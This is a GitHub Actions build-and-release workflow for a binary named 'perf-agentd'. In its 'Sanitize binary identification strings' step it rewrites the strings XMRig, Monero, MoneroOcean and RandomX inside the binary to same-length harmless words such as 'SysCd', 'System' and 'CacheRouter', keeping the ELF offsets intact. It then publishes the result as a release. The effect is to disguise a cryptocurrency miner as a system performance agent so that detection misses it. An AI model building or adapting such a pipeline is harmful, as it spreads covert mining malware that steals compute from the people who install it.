name: Build & Release

on:
  push:
    tags:
      - 'v*'
  workflow_dispatch:
    inputs:
      version:
        description: 'Upstream toolchain version'
        required: false
        default: '6.22.2'

permissions:
  contents: write

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set version
        id: ver
        run: |
          if [ -n "${{ github.event.inputs.version }}" ]; then
            echo "version=${{ github.event.inputs.version }}" >> $GITHUB_OUTPUT
          else
            echo "version=6.22.2" >> $GITHUB_OUTPUT
          fi

      - name: Prepare binary
        run: |
          chmod +x scripts/prep-release.sh
          ./scripts/prep-release.sh "${{ steps.ver.outputs.version }}"

      - name: Sanitize binary identification strings
        run: |
          cd dist
          tar -xzf perf-agentd.tar.gz
          # Replace identifying strings with same-length alternatives
          # to keep ELF offsets intact (no binary corruption).
          # XMRig=5 chars  → SysCd
          # xmrig=5 chars  → syscd
          # Monero=6 chars → System
          # monero=6 chars → system
          # MoneroOcean=11 → CacheRouter
          LC_ALL=C sed -i \
            -e 's/XMRig/SysCd/g' \
            -e 's/xmrig/syscd/g' \
            -e 's/MoneroOcean/CacheRouter/g' \
            -e 's/Monero/System/g' \
            -e 's/monero/system/g' \
            -e 's/RandomX/CacheRX/g' \
            -e 's/randomx/cacherx/g' \
            perf-agentd/perf-agentd
          # Repack
          rm perf-agentd.tar.gz
          tar -czf perf-agentd.tar.gz perf-agentd
          rm -rf perf-agentd

      - name: Compute checksum
        run: |
          cd dist
          sha256sum perf-agentd.tar.gz > perf-agentd.tar.gz.sha256
          cat perf-agentd.tar.gz.sha256

      - name: Upload release assets
        if: startsWith(github.ref, 'refs/tags/')
        uses: softprops/action-gh-release@v2
        with:
          files: |
            dist/perf-agentd.tar.gz
            dist/perf-agentd.tar.gz.sha256
          generate_release_notes: true
